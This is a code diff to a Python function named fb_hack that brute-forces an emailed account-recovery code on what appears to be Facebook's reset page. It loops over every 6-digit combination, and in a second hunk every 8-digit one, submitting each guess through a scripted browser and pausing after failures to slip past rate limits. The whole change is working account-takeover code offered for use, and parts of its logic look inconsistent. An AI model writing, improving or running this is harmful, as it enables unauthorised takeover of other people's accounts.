@@ -79,19 +79,34 @@ def fb_hack(email, codex):
   if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
     attempt = int(codex)
     print(check1)
-    f = open("6digits.txt", "r")
-    attempt = int(codex)
-    while check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
-      browser.select_form(nr=0)
-      y = f.readlines(attempt)
+    for combination in itertools.product(range(10), repeat=6):
+      y = (''.join(map(str, combination)))
       attempt += 1
       try:
+        browser.select_form(nr=0)
         browser.set_value(str(y), nr=5)
         browser.submit()
-        print(y, end='\r')
-        fail = (y, "failed")
-        success = (y, "succeded")
+        forms = list(browser.forms())
+        form = forms[0]
+        print(form)
+        browser.submit()
+        fail = (str(y), "failed")
+        success = (str(y), "succeded")
         s = " "
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+        if check2 != test:
+          print(s.join(fail))
+          reset1 = attempt
+          sleepy(30)
+        else:
+          response1 = browser.response()
+          soup = BeautifulSoup(response1, 'html.parser')
+          with open("output1.html", "w") as file:
+            file.write(str(soup))
+          break
+        
       except:
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
@@ -122,7 +137,7 @@ def fb_hack(email, codex):
   elif check2 != test:
     print(check2)
     attempt = int(codex)
-    for combination in itertools.product(range(10), repeat=6):
+    for combination in itertools.product(range(10), repeat=8):
       y = (''.join(map(str, combination)))
       attempt += 1
       try:
